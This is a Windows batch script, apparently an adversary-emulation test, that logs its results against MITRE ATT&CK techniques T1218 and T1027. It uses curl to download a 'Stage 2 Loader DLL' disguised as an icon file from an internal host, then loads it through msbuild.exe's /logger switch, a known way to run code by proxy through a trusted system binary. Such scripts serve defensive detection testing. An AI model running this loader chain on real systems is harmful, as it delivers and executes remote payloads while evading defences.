@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET a1b2c=%APPDATA%\10929\e57e78be
SET d3e4f=cae32580.txt
SET g5h6i=https://10.0.0.49/stage/2/icon.png?10929-7
SET j7k8l=ITZEL-S2BO
SET m9n0o=10929
SET p1q2r=7
SET s3t4u=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: heartbeat_start>> "!s3t4u!" 2>nul

REM Step 1: Download Stage 2 Loader DLL via curl heartbeat
curl -k -s -o "!a1b2c!\!d3e4f!" "!g5h6i!"
SET hb_err=!ERRORLEVEL!

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: heartbeat_complete>> "!s3t4u!" 2>nul

REM Check download result
if !hb_err! neq 0 (
    REM Log failure for both TTPs (download failed)
    echo [!tsvar!][TTP][!j7k8l!][!m9n0o!]: T1218^|System Binary Proxy Execution=FAIL:download_error>> "!s3t4u!" 2>nul
    echo [!tsvar!][TTP][!j7k8l!][!m9n0o!]: T1027^|Obfuscated Files or Information=FAIL:download_error>> "!s3t4u!" 2>nul
    goto :cleanup
)

REM Step 2: Change working directory to output directory
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: chdir_start>> "!s3t4u!" 2>nul
cd /d "!a1b2c!" >nul 2>&1
SET cd_err=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: chdir_result=!cd_err!>> "!s3t4u!" 2>nul

REM Debug: create .proj file
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: proj_create>> "!s3t4u!" 2>nul

REM Step 3: Create minimal .proj file for msbuild /logger: invocation
echo ^<Project/^> > "!a1b2c!\build.proj"

REM Debug: msbuild start
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: msbuild_start>> "!s3t4u!" 2>nul

REM Step 4: Invoke msbuild via /logger: switch (LOLBIN)
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!a1b2c!\build.proj" /logger:LoggerEntry,"!a1b2c!\!d3e4f!";MyParameters,Foo >NUL 2>&1
SET ms_err=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: msbuild_result=!ms_err!>> "!s3t4u!" 2>nul

REM Determine TTP result based on msbuild exit code
SET res=OK
SET err=
if !ms_err! neq 0 (
    SET res=FAIL
    SET err=msbuild_exit_!ms_err!
)

REM Log TTP lines
echo [!tsvar!][TTP][!j7k8l!][!m9n0o!]: T1218^|System Binary Proxy Execution=!res!:!err!>> "!s3t4u!" 2>nul
echo [!tsvar!][TTP][!j7k8l!][!m9n0o!]: T1027^|Obfuscated Files or Information=!res!:!err!>> "!s3t4u!" 2>nul

:cleanup
ENDLOCAL
exit /b 0